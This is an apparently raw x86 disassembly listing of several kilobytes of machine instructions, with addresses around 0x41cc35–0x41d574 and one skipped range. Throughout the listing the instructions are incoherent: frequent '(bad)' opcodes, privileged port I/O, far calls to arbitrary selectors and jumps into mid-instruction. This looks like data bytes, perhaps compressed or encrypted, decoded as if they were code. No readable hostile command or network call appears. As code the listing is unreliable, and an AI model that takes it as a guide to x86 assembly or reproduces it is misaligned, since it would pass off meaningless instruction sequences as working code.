  41cc35:	fimul  WORD PTR [ebx+0x79]
  41cc38:	call   0xda73:0x513a8ece
  41cc3f:	jnp    0x41cc93
  41cc41:	sbb    ecx,DWORD PTR [esi]
  41cc43:	fistp  QWORD PTR [edi+0x20a47caf]
  41cc49:	outs   dx,BYTE PTR ds:[esi]
  41cc4a:	adc    ecx,esi
  41cc4c:	jb     0x41cc24
  41cc4e:	hlt    
  41cc4f:	jnp    0x41cc43
  41cc51:	mov    bl,dh
  41cc53:	aas    
  41cc54:	dec    edi
  41cc55:	pop    ecx
  41cc56:	add    ebp,edi
  41cc58:	jmp    0x41cca2
  41cc5a:	out    0x5c,eax
  41cc5c:	ss jmp 0xbb34:0xf6368eb
  41cc64:	js     0x41cbf8
  41cc66:	jae    0x41ccb0
  41cc68:	sbb    edi,DWORD PTR [esi]
  41cc6a:	call   0x8617:0xae35fc7f
  41cc71:	sub    eax,0x822eb339
  41cc76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc77:	xchg   edx,eax
  41cc78:	xchg   esi,eax
  41cc79:	push   eax
  41cc7a:	(bad)  
  41cc7b:	outs   dx,BYTE PTR ds:[esi]
  41cc7c:	icebp  
  41cc7d:	nop
  41cc7e:	hlt    
  41cc7f:	xor    cl,ah
  41cc81:	adc    ah,cl
  41cc83:	sbb    DWORD PTR [ebx+0x12],ebp
  41cc86:	out    0x3c,al
  41cc88:	add    DWORD PTR [edx+edx*4+0x3d728b72],esp
  41cc8f:	push   ebx
  41cc90:	dec    edx
  41cc91:	jg     0x41cc7d
  41cc93:	push   0xd484413e
  41cc98:	imul   eax,eax,0x1860528b
  41cc9e:	push   ebp
  41cc9f:	test   al,0x20
  41cca1:	test   BYTE PTR [ebx-0x38],ch
  41cca4:	dec    esi
  41cca5:	fild   DWORD PTR gs:[ecx+0x6fba5705]
  41ccac:	push   esp
  41ccad:	in     al,0x93
  41ccaf:	(bad)  
  41ccb0:	in     al,dx
  41ccb1:	mov    esp,0xf2283f82
  41ccb6:	xor    DWORD PTR [ebp+0x68],edx
  41ccb9:	ss out 0x6e,al
  41ccbc:	sbb    ch,BYTE PTR [edx]
  41ccbe:	lock mov ebp,0x6426587
  41ccc4:	xchg   edx,eax
  41ccc5:	dec    BYTE PTR [edx]
  41ccc7:	mov    ecx,ecx
  41ccc9:	jne    0x41cc95
  41cccb:	or     edx,esp
  41cccd:	mov    ecx,0xfd5c61d2
  41ccd2:	jne    0x41cce0
  41ccd4:	sub    BYTE PTR [ecx-0x22],ah
  41ccd7:	dec    ebp
  41ccd8:	jno    0x41cd46
  41ccda:	pop    edx
  41ccdb:	std    
  41ccdc:	push   esi
  41ccdd:	push   edx
  41ccde:	mov    al,0xc6
  41cce0:	je     0x41ccd1
  41cce2:	sahf   
  41cce3:	aam    0xd0
  41cce5:	jp     0x41cd0c
  41cce7:	dec    edi
  41cce8:	cwde   
  41cce9:	mov    ebx,0xd1153bde
  41ccee:	cli    
  41ccef:	inc    ecx
  41ccf0:	pop    ebp
  41ccf1:	repnz out dx,eax
  41ccf3:	cmp    al,0x4b
  41ccf5:	(bad)  
  41ccf6:	jb     0x41cd1d
  41ccf8:	(bad)  
  41ccf9:	fwait
  41ccfa:	in     al,0xa8
  41ccfc:	imul   edi,esi,0xfffffff6
  41ccff:	mov    bh,0x39
  41cd01:	lea    edi,[ebp-0x15a9af2b]
  41cd07:	adc    BYTE PTR [ecx+0x3b],0x87
  41cd0b:	mov    ecx,0xe668f6c6
  41cd10:	push   edx
  41cd11:	jp     0x41cd87
  41cd13:	jmp    0x41ccd0
  41cd15:	cmc    
  41cd16:	gs out dx,eax
  41cd18:	or     esi,DWORD PTR ds:0xb24045df
  41cd1e:	inc    ebp
  41cd1f:	pop    edi
  41cd20:	scas   al,BYTE PTR es:[edi]
  41cd21:	xchg   ebp,eax
  41cd22:	mov    dh,0xcf
  41cd24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd25:	adc    eax,0x9b24f447
  41cd2a:	hlt    
  41cd2b:	int    0x8b
  41cd2d:	daa    
  41cd2e:	retf   
  41cd2f:	jo     0x41cd6f
  41cd31:	cmp    ebp,DWORD PTR [edi+0x5a]
  41cd34:	pushf  
  41cd35:	xchg   BYTE PTR [ebp+0x7aae72ac],bl
  41cd3b:	out    0xa5,eax
  41cd3d:	sbb    DWORD PTR [edx+0x4c],ebp
  41cd40:	das    
  41cd41:	sbb    al,BYTE PTR [edi]
  41cd43:	add    esp,ecx
  41cd45:	cmp    BYTE PTR [edx+0x1fc52ea5],0x58
  41cd4c:	test   BYTE PTR [edx+0x6b],ch
  41cd4f:	mov    ds:0xd790874f,al
  41cd54:	push   edx
  41cd55:	xor    DWORD PTR [ecx-0x7e],0x2f08b82b
  41cd5c:	nop
  41cd5d:	mov    cl,0xad
  41cd5f:	lock and BYTE PTR [esi],ah
  41cd62:	inc    ecx
  41cd63:	jle    0x41cd07
  41cd65:	mov    edx,0x8125b0dd
  41cd6a:	fidivr DWORD PTR [ebx-0x27452c8e]
  41cd70:	push   cs
  41cd71:	pop    esp
  41cd72:	fisubr DWORD PTR [ecx-0x7f6852fe]
  41cd78:	ins    BYTE PTR es:[edi],dx
  41cd79:	out    0xe3,eax
  41cd7b:	mov    dl,0x5f
  41cd7d:	dec    edi
  41cd7e:	sbb    eax,0x7d0ebc39
  41cd83:	call   0x8554:0x9b7b36e8
  41cd8a:	ja     0x41cd32
  41cd8c:	ds popa 
  41cd8e:	push   0xffffffbc
  41cd90:	mov    ch,0x31
  41cd92:	pushf  
  41cd93:	js     0x41cd60
  41cd95:	adc    eax,0x55f60ec1
  41cd9a:	(bad)  
  41cd9b:	je     0x41cdb5
  41cd9d:	jge    0x41cd3e
  41cd9f:	add    al,0xc6
  41cda1:	clc    
  41cda2:	mov    al,0x2d
  41cda4:	ins    BYTE PTR es:[edi],dx
  41cda5:	jbe    0x41cd30
  41cda7:	adc    bh,0xdc
  41cdaa:	bound  esi,QWORD PTR [edx]
  41cdac:	ret    0x55e0
  41cdaf:	fiadd  WORD PTR [edi]
  41cdb1:	(bad)  
  41cdb2:	cs add al,0x65
  41cdb5:	test   eax,0x5aa3bcaf
  41cdba:	push   es
  41cdbb:	push   ebp
  41cdbc:	add    DWORD PTR [eax-0x2e],0xb54ccd5d
  41cdc3:	mov    bl,0x9d
  41cdc5:	leave  
  41cdc6:	pop    ebx
  41cdc7:	pop    esi
  41cdc8:	pusha  
  41cdc9:	cdq    
  41cdca:	lods   eax,DWORD PTR ds:[esi]
  41cdcb:	mov    dh,0x30
  41cdcd:	jnp    0x41cdf4
  41cdcf:	pop    edi
  41cdd0:	sbb    eax,0x6324bfff
  41cdd5:	jp     0x41ce34
  41cdd7:	sbb    eax,0x25de158
  41cddc:	ss int 0xb1
  41cddf:	or     DWORD PTR [esi+0x41],esi
  41cde2:	push   eax
  41cde3:	mov    ds,ebp
  41cde5:	inc    esp
  41cde6:	add    cl,BYTE PTR [edi-0x79]
  41cde9:	mov    al,0xaf
  41cdeb:	inc    ebp
  41cdec:	shl    ah,1
  41cdee:	aas    
  41cdef:	pop    esi
  41cdf0:	sbb    eax,0xd32f339b
  41cdf5:	shl    DWORD PTR [ecx],cl
  41cdf7:	push   ecx
  41cdf8:	and    BYTE PTR fs:[ebx],bl
  41cdfb:	dec    esi
  41cdfc:	push   esp
  41cdfd:	out    dx,eax
  41cdfe:	cld    
  41cdff:	data16 sbb al,0x33
  41ce02:	leave  
  41ce03:	mov    edx,0x55462a95
  41ce08:	jo     0x41ce01
  41ce0a:	mov    ah,0x7f
  41ce0c:	test   DWORD PTR [edi-0x16264c3d],esi
  41ce12:	mov    edi,0x4dd64702
  41ce17:	cmp    al,0x51
  41ce19:	lea    esi,[edi]
  41ce1b:	xor    BYTE PTR [eax+0x6c],cl
  41ce1e:	or     eax,0xd67d5d89
  41ce23:	mov    edi,0xb3a45e81
  41ce28:	out    0xb0,al
  41ce2a:	xchg   ebp,eax
  41ce2b:	push   ecx
  41ce2c:	dec    ebp
  41ce2d:	sbb    BYTE PTR [ecx-0x35],al
  41ce30:	sbb    edi,edi
  41ce32:	push   esi
  41ce33:	push   cs
  41ce34:	lds    ebx,FWORD PTR [ecx-0x5e614a35]
  41ce3a:	or     BYTE PTR [ebp+ecx*2-0x388ec6c1],ch
  41ce41:	es lock jae 0x41ceb2
  41ce45:	xor    edx,DWORD PTR [ecx+0x45b671f1]
  41ce4b:	cld    
  41ce4c:	mov    al,ds:0x9d86237e
  41ce51:	mov    ebp,0xe8f8bebd
  41ce56:	mov    dl,0x88
  41ce58:	xchg   esi,eax
  41ce59:	jnp    0x41ceda
  41ce5b:	fisubr DWORD PTR [eax+0x5b88afbc]
  41ce61:	ror    BYTE PTR [edx+0x33],0xfa
  41ce65:	stos   BYTE PTR es:[edi],al
  41ce66:	push   eax
  41ce67:	mov    ds:0x3f37c673,al
  41ce6c:	pusha  
  41ce6d:	jl     0x41cee7
  41ce6f:	es int3 
  41ce71:	ja     0x41ced1
  41ce73:	mov    cl,0x9a
  41ce75:	push   eax
  41ce76:	adc    al,0x98
  41ce78:	cmp    DWORD PTR [esi+0x6e0d08e0],edi
  41ce7e:	in     al,0xd6
  41ce80:	pop    si
  41ce82:	jae    0x41ce63
  41ce84:	dec    eax
  41ce85:	aad    0x61
  41ce87:	dec    BYTE PTR ds:0x4f32f332
  41ce8d:	inc    esp
  41ce8e:	stos   BYTE PTR es:[edi],al
  41ce8f:	and    BYTE PTR [ebx],cl
  41ce91:	mov    eax,ds:0x57b504ff
  41ce96:	je     0x41ce73
  41ce98:	pusha  
  41ce99:	out    dx,al
  41ce9a:	sub    BYTE PTR [edi],0xcf
  41ce9d:	mov    ebp,0x200c3195
  41cea2:	mov    eax,0x5e8206a6
  41cea7:	xchg   eax,edi
  41cea9:	fadd   DWORD PTR [ebx]
  41ceab:	leave  
  41ceac:	push   ss
  41cead:	or     DWORD PTR [eax-0x7c943db2],esp
  41ceb3:	xor    al,0x2
  41ceb5:	arpl   WORD PTR [edi+ebx*2+0x6e],cx
  41ceb9:	sbb    eax,0xfd01bab1
  41cebe:	pusha  
  41cebf:	adc    BYTE PTR [edi-0xf],ah
  41cec2:	or     eax,0x666f6558
  41cec7:	jno    0x41cf19
  41cec9:	xor    al,0xbd
  41cecb:	fcmovbe st,st(3)
  41cecd:	jp     0x41ce7c
  41cecf:	ds into 
  41ced1:	nop
  41ced2:	mov    DWORD PTR [ebx-0x254ea527],ebp
  41ced8:	repz cli 
  41ceda:	adc    DWORD PTR [edi+0x21],ecx
  41cedd:	ret    0x6323
  41cee0:	push   cs
  41cee1:	mov    edx,0x34b8389c
  41cee6:	repz das 
  41cee8:	xchg   edx,eax
  41cee9:	xchg   edx,eax
  41ceea:	adc    al,0xae
  41ceec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ceed:	mov    ebx,DWORD PTR [ebx-0x67b4e0fd]
  41cef3:	mov    ch,0xd6
  41cef5:	sub    dl,BYTE PTR [ecx-0xe190519]
  41cefb:	jbe    0x41cf52
  41cefd:	xor    esp,ebx
  41ceff:	mov    ebx,0x2a69b05e
  41cf04:	(bad)  
  41cf05:	or     BYTE PTR [ebx],al
  41cf07:	or     ch,BYTE PTR [ecx+eiz*4-0x166ed597]
  41cf0e:	loop   0x41cf1e
  41cf10:	and    edx,DWORD PTR [edx]
  41cf12:	je     0x41cf58
  41cf14:	lea    eax,ds:0x1d418db3
  41cf1a:	push   esi
  41cf1b:	iret   
  41cf1c:	idiv   DWORD PTR ds:0xa1d959cf
  41cf22:	push   ss
  41cf23:	loope  0x41cedf
  41cf25:	fld    DWORD PTR [edx-0x8ce8a05]
  41cf2b:	adc    al,0xf5
  41cf2d:	jp     0x41cf46
  41cf2f:	or     al,0x53
  41cf31:	in     eax,0x8
  41cf33:	adc    dl,dh
  41cf35:	adc    eax,0xe308ea86
  41cf3a:	push   edi
  41cf3b:	pushf  
  41cf3c:	loopne 0x41cfa0
  41cf3e:	aaa    
  41cf3f:	xor    ch,ah
  41cf41:	shl    BYTE PTR [esi+0x6f],1
  41cf44:	dec    BYTE PTR [edx]
  41cf46:	xchg   ebp,eax
  41cf47:	ror    edx,1
  41cf49:	test   al,0x89
  41cf4b:	mov    ss,WORD PTR [edi]
  41cf4d:	mov    ecx,0xbc9be232
  41cf52:	mov    dl,0xb6
  41cf54:	jbe    0x41ceff
  41cf56:	mov    fs,WORD PTR [ebx+0x8]
  41cf59:	aam    0xd6
  41cf5b:	pop    ss
  41cf5c:	xchg   ebx,eax
  41cf5d:	jbe    0x41cf14
  41cf5f:	arpl   WORD PTR [ebx+edx*8+0x7d],cx
  41cf63:	dec    edx
  41cf64:	retf   0x459d
  41cf67:	xor    DWORD PTR [ebp-0x73],edi
  41cf6a:	xchg   ebp,eax
  41cf6b:	std    
  41cf6c:	out    0x65,eax
  41cf6e:	xlat   BYTE PTR ds:[ebx]
  41cf6f:	jg     0x41cfb8
  41cf71:	inc    esi
  41cf72:	xor    esp,esi
  41cf74:	pop    edi
  41cf75:	mov    bh,0x25
  41cf77:	jg     0x41cfcc
  41cf79:	push   esp
  41cf7a:	ss xchg ebx,eax
  41cf7c:	jle    0x41cfc5
  41cf7e:	and    BYTE PTR [ebx-0x26],dh
  41cf81:	add    ebp,DWORD PTR [edx]
  41cf83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf84:	mov    ah,ch
  41cf86:	fld    DWORD PTR [esi-0x44edeabc]
  41cf8c:	cmp    BYTE PTR [ebp*1+0x7229da83],0xeb
  41cf94:	add    ebp,edi
  41cf96:	and    DWORD PTR [edx],esp
  41cf98:	sbb    ecx,edx
  41cf9a:	(bad)  
  41cf9b:	adc    edi,0x6a
  41cf9e:	xchg   DWORD PTR [ecx+ebx*1-0x63efe078],esp
  41cfa5:	out    0x4f,al
  41cfa7:	es test al,0xfb
  41cfaa:	out    0xe9,al
  41cfac:	or     BYTE PTR [ecx+0x44],al
  41cfaf:	sbb    al,0x4a
  41cfb1:	and    DWORD PTR [ebp*4+0x48d9d62a],edx
  41cfb8:	inc    esp
  41cfb9:	imul   esi,edx,0xbf0a418d
  41cfbf:	mov    ecx,0xde0c568c
  41cfc4:	ret    
  41cfc5:	popa   
  41cfc6:	jbe    0x41cfe1
  41cfc8:	call   0x475d:0xf11a15cd
  41cfcf:	jl     0x41cfaa
  41cfd1:	jbe    0x41d04c
  41cfd3:	or     ecx,DWORD PTR [edi+edi*8-0x5817fe0c]
  41cfda:	xor    ebp,edi
  41cfdc:	es int 0x7
  41cfdf:	in     eax,0xc2
  41cfe1:	dec    DWORD PTR [ecx+0x5418bcfe]
  41cfe7:	jle    0x41cff7
  41cfe9:	lock add BYTE PTR [eax],al
	...
  41d1c0:	add    BYTE PTR [eax],al
  41d1c2:	inc    ecx
  41d1c3:	inc    BYTE PTR [ebx+eiz*1-0x1188441]
  41d1ca:	push   ecx
  41d1cb:	jecxz  0x41d1f2
  41d1cd:	arpl   si,di
  41d1cf:	test   BYTE PTR [edi+0x184e73e],0x0
  41d1d6:	push   ds
  41d1d7:	pop    es
  41d1d8:	add    BYTE PTR [eax],al
  41d1da:	sbb    eax,0xc03537a8
  41d1df:	mov    dl,BYTE PTR [ebx]
  41d1e1:	pop    ds
  41d1e2:	(bad)  
  41d1e4:	add    eax,ebp
  41d1e6:	jl     0x41d1ce
  41d1e8:	aaa    
  41d1e9:	mov    edi,0x1332f481
  41d1ee:	mov    bl,0x23
  41d1f0:	add    DWORD PTR [ebp-0xd],eax
  41d1f3:	dec    esi
  41d1f4:	ret    0xc975
  41d1f7:	mov    ah,0xef
  41d1f9:	dec    esi
  41d1fa:	dec    ebx
  41d1fb:	inc    esp
  41d1fc:	mov    ebx,cs
  41d1fe:	jbe    0x41d278
  41d200:	dec    esp
  41d201:	push   es
  41d202:	cmp    eax,0xc74e4fda
  41d207:	jnp    0x41d21d
  41d209:	mov    cl,0x34
  41d20b:	mov    ebx,0x8b7009bf
  41d210:	mov    ds:0xc75835f5,al
  41d215:	sbb    al,0xbc
  41d217:	ins    BYTE PTR es:[edi],dx
  41d218:	(bad)  
  41d219:	and    ecx,ebp
  41d21b:	pop    ecx
  41d21c:	adc    al,0x8d
  41d21e:	sbb    BYTE PTR [ebx+0x3c],dh
  41d221:	inc    esi
  41d222:	bound  edx,QWORD PTR [ecx]
  41d224:	mov    ecx,cs
  41d226:	pop    ebp
  41d227:	jno    0x41d275
  41d229:	jmp    0x2cbc:0xcfc25de5
  41d230:	bound  edi,QWORD PTR ds:0xfab592c3
  41d236:	in     eax,dx
  41d237:	out    dx,al
  41d238:	dec    ecx
  41d239:	and    al,BYTE PTR [esi+esi*4]
  41d23c:	jle    0x41d1c7
  41d23e:	xor    ebp,0xffffff98
  41d241:	test   DWORD PTR [ebx],edi
  41d243:	enter  0x426b,0xfa
  41d247:	or     ebx,0x70
  41d24a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d24b:	ffree  st(4)
  41d24d:	aad    0xb4
  41d24f:	jbe    0x41d263
  41d251:	div    DWORD PTR [esi+0x8]
  41d254:	sbb    BYTE PTR [eax-0x43b892f3],ch
  41d25a:	adc    DWORD PTR [ecx-0x29fe5906],ebp
  41d260:	das    
  41d261:	dec    esi
  41d262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d263:	or     edi,DWORD PTR cs:[ecx]
  41d266:	pop    esi
  41d267:	mov    BYTE PTR ds:0x45e03802,al
  41d26d:	sub    eax,0x188b0c0b
  41d272:	xchg   ecx,eax
  41d273:	mov    eax,0x97f0f3ce
  41d278:	push   esp
  41d279:	adc    al,0x44
  41d27c:	in     al,dx
  41d27d:	popa   
  41d27e:	mov    eax,ds:0x6d63931f
  41d283:	push   ebx
  41d284:	pushf  
  41d285:	lods   eax,DWORD PTR ds:[esi]
  41d286:	pop    esi
  41d287:	fxch   st(3)
  41d289:	xchg   esp,eax
  41d28a:	mov    ss,WORD PTR [ebp-0x58]
  41d28d:	jmp    0x7b50:0xb2d84d3c
  41d294:	into   
  41d295:	out    dx,eax
  41d296:	or     eax,0xe95ea03
  41d29b:	sub    edx,ebp
  41d29d:	or     ch,BYTE PTR [ebx]
  41d29f:	mov    DWORD PTR fs:[edx],esi
  41d2a2:	cmc    
  41d2a3:	icebp  
  41d2a4:	aaa    
  41d2a5:	cmc    
  41d2a6:	int    0x14
  41d2a8:	(bad)  
  41d2a9:	rol    BYTE PTR [esi-0x2b8fbd33],1
  41d2af:	inc    esi
  41d2b0:	cmc    
  41d2b1:	test   DWORD PTR [edi+0x420c730b],ecx
  41d2b7:	fld    TBYTE PTR ds:0x30ffa2fb
  41d2bd:	push   esp
  41d2be:	ret    
  41d2bf:	mov    bh,0xd9
  41d2c1:	sub    BYTE PTR [ecx],0x16
  41d2c4:	sti    
  41d2c5:	pusha  
  41d2c6:	sbb    cl,BYTE PTR [esi+0x91ed3fe]
  41d2cc:	pop    eax
  41d2cd:	add    ebp,esp
  41d2cf:	adc    ah,BYTE PTR [ebp-0x6c06f517]
  41d2d5:	cmp    DWORD PTR [eax+0x4f],eax
  41d2d8:	data16 in al,dx
  41d2da:	pop    esp
  41d2db:	sub    ecx,DWORD PTR [edx-0x40882faa]
  41d2e1:	push   ebx
  41d2e2:	dec    eax
  41d2e3:	mov    eax,ds:0x270cdc0
  41d2e8:	pop    edx
  41d2e9:	adc    eax,0x9dedeb65
  41d2ee:	cwde   
  41d2ef:	fbstp  TBYTE PTR [edx+0x41297ea5]
  41d2f5:	and    DWORD PTR [ebx],edi
  41d2f7:	mov    edi,0x72cde3c4
  41d2fc:	(bad)  
  41d2fd:	mov    bh,BYTE PTR [ecx-0x18]
  41d300:	sub    DWORD PTR [ecx+0x72],ebx
  41d303:	test   eax,0xe3087878
  41d308:	fsubr  DWORD PTR [edx+ebx*8+0x5c]
  41d30c:	mov    eax,eax
  41d30e:	cmc    
  41d30f:	aam    0xb9
  41d311:	cs retf 
  41d313:	and    ebp,DWORD PTR [eax+eax*1]
  41d316:	cs nop
  41d318:	mov    bl,0x15
  41d31a:	fsub   st(3),st
  41d31c:	daa    
  41d31d:	sub    esp,esp
  41d31f:	jnp    0xfbb641db
  41d325:	(bad)  
  41d326:	jne    0x41d2eb
  41d328:	sub    eax,0x9a7d39fb
  41d32d:	pop    edi
  41d32e:	out    dx,eax
  41d32f:	(bad)  
  41d330:	lods   al,BYTE PTR ds:[esi]
  41d331:	(bad)  
  41d332:	jmp    0x301bdeac
  41d337:	in     eax,0x7b
  41d339:	pop    esp
  41d33a:	inc    esp
  41d33b:	sub    dl,bl
  41d33d:	je     0x41d34a
  41d33f:	dec    DWORD PTR ds:0xfaccadf
  41d345:	jbe    0x41d35c
  41d347:	pop    eax
  41d348:	mov    esi,0x1a0dd9ee
  41d34d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d34e:	int    0x18
  41d350:	jl     0x41d39c
  41d352:	and    al,0x6b
  41d354:	repz repz out dx,eax
  41d357:	push   cs
  41d358:	cmc    
  41d359:	jl     0x41d3b1
  41d35b:	mov    cl,bh
  41d35d:	(bad)  
  41d35f:	jl     0x41d389
  41d361:	dec    eax
  41d362:	and    edi,DWORD PTR ds:0x8622c7b9
  41d368:	in     eax,0x21
  41d36a:	mov    edx,0xc2f6878
  41d36f:	ins    BYTE PTR es:[edi],dx
  41d370:	stos   BYTE PTR es:[edi],al
  41d371:	inc    esp
  41d372:	lods   eax,DWORD PTR ds:[esi]
  41d373:	pop    edx
  41d374:	call   0x2b26d3d2
  41d379:	out    dx,al
  41d37a:	and    BYTE PTR [edi-0x423cddfe],ch
  41d380:	mov    ?,WORD PTR [edx]
  41d382:	je     0x41d38f
  41d384:	es mov ebp,0xe201e47f
  41d38a:	cli    
  41d38b:	aaa    
  41d38c:	mov    dl,0x66
  41d38e:	fadd   DWORD PTR [edx+0x3ba66fdc]
  41d394:	dec    eax
  41d395:	fstp   QWORD PTR [ecx]
  41d397:	clc    
  41d398:	and    eax,0xe6fb86d2
  41d39d:	fistp  DWORD PTR [ebx-0x6f05b96c]
  41d3a3:	loope  0x41d388
  41d3a5:	and    DWORD PTR [ebp-0x55b95c5c],0x54255dfe
  41d3af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3b0:	and    ah,dl
  41d3b2:	inc    edx
  41d3b3:	loopne 0x41d420
  41d3b5:	cmp    esp,DWORD PTR [esp+eax*4]
  41d3b8:	in     eax,dx
  41d3b9:	push   edx
  41d3ba:	lea    esp,[ebx+eax*4+0x50]
  41d3be:	jnp    0x41d378
  41d3c0:	stos   DWORD PTR es:[edi],eax
  41d3c1:	dec    edx
  41d3c2:	mov    dh,0x75
  41d3c4:	and    ecx,ebx
  41d3c6:	xor    edi,ecx
  41d3c8:	call   0x9f796c01
  41d3cd:	mov    bl,0x9
  41d3cf:	scas   al,BYTE PTR es:[edi]
  41d3d0:	jp     0x41d3fe
  41d3d2:	xchg   edx,eax
  41d3d3:	imul   esp,DWORD PTR [edx+0x751f3d1c],0x2a64c1ce
  41d3dd:	pop    eax
  41d3de:	sbb    al,0x75
  41d3e0:	stc    
  41d3e1:	inc    esp
  41d3e2:	fdivr  DWORD PTR [esi+edx*1+0x79]
  41d3e6:	pop    ebx
  41d3e7:	(bad)  
  41d3e8:	loope  0x41d39d
  41d3ea:	repz add bh,al
  41d3ed:	jns    0x41d3e6
  41d3ef:	aad    0x84
  41d3f1:	pmulhw mm5,QWORD PTR [eax+edi*1]
  41d3f5:	dec    edi
  41d3f6:	arpl   WORD PTR [edi+edi*8],ax
  41d3f9:	daa    
  41d3fa:	retf   0x96bf
  41d3fd:	or     edx,DWORD PTR [edi]
  41d3ff:	cli    
  41d400:	mov    cl,0x5b
  41d402:	sar    DWORD PTR [esi+ebx*4+0x52],1
  41d406:	mov    ebx,0xd36be0df
  41d40b:	add    al,0x80
  41d40d:	leave  
  41d40e:	ss adc al,0x58
  41d411:	jle    0x41d47c
  41d413:	sub    eax,0x19426555
  41d418:	in     al,0xee
  41d41a:	xor    bh,BYTE PTR [ecx+0xa]
  41d41d:	icebp  
  41d41e:	fisubr WORD PTR [esi]
  41d420:	inc    ebp
  41d421:	dec    esi
  41d422:	cmp    BYTE PTR [esi-0x36d39215],dl
  41d428:	sbb    al,0xd4
  41d42a:	mov    WORD PTR [eax+0x202d1539],?
  41d430:	les    edi,FWORD PTR ds:0xfdc65e34
  41d436:	and    bl,al
  41d438:	or     BYTE PTR [esi+ebx*2-0x34d35399],ch
  41d43f:	enter  0x330c,0xfb
  41d443:	xchg   BYTE PTR [ebx+0x57f5ca4],al
  41d449:	loop   0x41d443
  41d44b:	inc    edx
  41d44c:	sub    cl,ah
  41d44e:	cmp    eax,0x21da1689
  41d453:	scas   al,BYTE PTR es:[edi]
  41d454:	mov    eax,ds:0x28934554
  41d459:	sbb    BYTE PTR [ecx],0x8e
  41d45c:	mov    al,ds:0x909d7917
  41d461:	test   DWORD PTR [eax],esi
  41d463:	xchg   ebx,eax
  41d464:	mov    dl,0xe5
  41d466:	lock popf 
  41d468:	and    dh,BYTE PTR [bx+si-0x3e22]
  41d46d:	icebp  
  41d46e:	inc    eax
  41d46f:	pop    edi
  41d470:	ins    BYTE PTR es:[edi],dx
  41d471:	pusha  
  41d472:	inc    eax
  41d473:	dec    edx
  41d474:	(bad)  
  41d475:	std    
  41d476:	enter  0xe59d,0x45
  41d47a:	pop    eax
  41d47b:	xchg   ecx,eax
  41d47c:	add    BYTE PTR [esi],cl
  41d47e:	inc    eax
  41d47f:	bound  edi,QWORD PTR [eax+0x24118b07]
  41d485:	mov    ah,0x3c
  41d487:	rol    DWORD PTR [edx+0x63],cl
  41d48a:	pop    ss
  41d48b:	iret   
  41d48c:	xor    eax,0x5d07d6e1
  41d491:	sub    al,0xba
  41d493:	dec    edx
  41d494:	ja     0x41d4f1
  41d496:	xor    al,0xb0
  41d498:	js     0x41d46c
  41d49a:	pop    edi
  41d49b:	jle    0x41d4a9
  41d49d:	test   BYTE PTR [edi-0xc96bdcf],cl
  41d4a3:	cmp    eax,0x8f2a16c7
  41d4a8:	jns    0x41d445
  41d4aa:	scas   al,BYTE PTR es:[edi]
  41d4ab:	mov    gs,edi
  41d4ad:	jmp    0x41d4e7
  41d4af:	sub    DWORD PTR ds:0xc45d252f,ebx
  41d4b6:	xchg   ebx,eax
  41d4b7:	inc    ebp
  41d4b8:	dec    esi
  41d4b9:	mov    dh,BYTE PTR [ecx]
  41d4bb:	ins    DWORD PTR es:[edi],dx
  41d4bc:	stc    
  41d4bd:	sub    esi,DWORD PTR [ebp+0x4d]
  41d4c0:	(bad)  
  41d4c1:	(bad)  
  41d4c3:	popa   
  41d4c4:	pop    ebx
  41d4c5:	cmc    
  41d4c6:	out    dx,al
  41d4c7:	ins    BYTE PTR es:[edi],dx
  41d4c8:	(bad)  
  41d4ca:	jns    0x41d510
  41d4cc:	and    BYTE PTR [edx+0x4b],cl
  41d4cf:	icebp  
  41d4d0:	cmp    al,0xfa
  41d4d2:	fwait
  41d4d3:	cli    
  41d4d4:	sub    DWORD PTR [ebx],0xfffffff3
  41d4d7:	jmp    0x41d4a3
  41d4d9:	cmp    dl,BYTE PTR [ebx]
  41d4db:	icebp  
  41d4dc:	mov    DWORD PTR [ecx+0x4cad13d8],edi
  41d4e2:	imul   esi,DWORD PTR [esi+0x58d89136],0x9aa5fe91
  41d4ec:	icebp  
  41d4ed:	mov    eax,0xfe605a16
  41d4f2:	and    cl,BYTE PTR [esi-0x5a]
  41d4f5:	loope  0x41d479
  41d4f7:	ror    DWORD PTR [ebx],1
  41d4f9:	cmp    DWORD PTR [edx],esi
  41d4fb:	das    
  41d4fc:	popf   
  41d4fd:	jns    0x41d546
  41d4ff:	sbb    edx,esp
  41d501:	add    al,dh
  41d503:	lahf   
  41d504:	mov    al,0xfe
  41d506:	je     0x41d56e
  41d508:	je     0x41d4ac
  41d50a:	dec    edx
  41d50b:	(bad)  
  41d50c:	jmp    0xacd3:0x84bc0bbc
  41d513:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41d515:	loopne 0x41d51c
  41d517:	pusha  
  41d518:	adc    DWORD PTR [edi+ebp*4+0x32],edx
  41d51c:	int3   
  41d51d:	sbb    al,0x68
  41d51f:	imul   ebp,DWORD PTR [ebx],0xffffffdd
  41d522:	sbb    DWORD PTR gs:[ebp+ecx*1-0x2c],ecx
  41d527:	sbb    eax,0xd65a31df
  41d52c:	out    dx,eax
  41d52d:	nop
  41d52e:	shr    ebx,0x98
  41d531:	or     ebp,ebp
  41d533:	neg    BYTE PTR [ebx+0x59]
  41d536:	push   esi
  41d537:	cmp    al,0xf7
  41d539:	mov    al,ds:0xa8e94aee
  41d53e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d53f:	push   ss
  41d540:	stos   BYTE PTR es:[edi],al
  41d541:	arpl   WORD PTR [ebx+ebx*1],ax
  41d544:	push   ebp
  41d545:	mov    eax,ds:0x318136f6
  41d54a:	out    0xe1,eax
  41d54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d54d:	arpl   WORD PTR [ecx-0x2779aea2],di
  41d553:	or     BYTE PTR [edx+eax*2],ch
  41d556:	call   0x53f2659f
  41d55b:	push   ebx
  41d55c:	push   ebx
  41d55d:	or     BYTE PTR [ebp+0x1d],0xa7
  41d561:	arpl   WORD PTR [eax+0x5],cx
  41d564:	ss loope 0x41d516
  41d567:	and    eax,0xf86e7349
  41d56c:	jmp    0x921b80af
  41d571:	pop    ebp
  41d572:	aas    
  41d573:	pusha  
  41d574:	(bad)  
